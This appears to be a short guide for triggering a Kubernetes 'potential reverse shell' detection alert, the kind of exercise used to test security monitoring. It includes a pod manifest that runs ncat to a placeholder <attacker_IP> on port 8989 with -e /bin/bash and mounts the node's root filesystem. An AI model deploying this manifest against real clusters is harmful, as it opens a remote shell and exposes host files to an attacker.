# Detection of a potential reverse shell

Analysis of processes running within a container or directly on a Kubernetes node, has detected a potential reverse shell. These are used to get a compromised machine to call back into a machine an attacker owns

This is categorized as a Medium severy alert

This alert maps to Exfiltration and Explotation with MITRE ATT&CK® tactics

Create a pod definition file as this:

Substitue the <attacker_IP> with your own one

This pod will issue the following command /usr/local/bin/ncat <attacker_IP> 8989 -e /bin/bash


```
apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
  labels:
    app: ncat
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: ['<attacker_IP>', '8989', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
```

![reverse-shell](/images/reverse-shell.png)